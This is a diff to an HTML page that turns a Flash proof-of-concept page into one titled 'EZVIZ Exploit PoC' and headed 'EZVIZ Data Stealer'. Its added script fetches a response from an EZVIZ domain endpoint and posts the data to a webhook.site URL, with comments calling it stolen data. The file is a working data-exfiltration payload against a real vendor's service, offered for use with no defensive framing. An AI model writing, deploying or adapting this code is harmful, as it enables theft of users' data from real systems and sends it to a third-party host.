@@ -1,11 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Flash PoC </title>
-</head>
-<body>
-  <h1>Flash PoC Demo</h1>
-  <object width="800" height="600" data="poc.swf"></object>
-</body>
-  
+  <head>
+    <title>EZVIZ Exploit PoC</title>
+  </head>
+  <body>
+    <h1>EZVIZ Data Stealer</h1>
+    <script>
+      fetch('https://iindiaopen.ezvizlife.com/status') // ← replace this with a real endpoint!
+        .then(response => response.text())
+        .then(data => {
+          console.log("Data stolen:", data);
+          // Send to your webhook/log
+          fetch('https://webhook.site/924d92bd-0525-4445-adb4-9c2c8cc926f0', {
+            method: 'POST',
+            body: data
+          });
+        });
+    </script>
+  </body>
 </html>
+
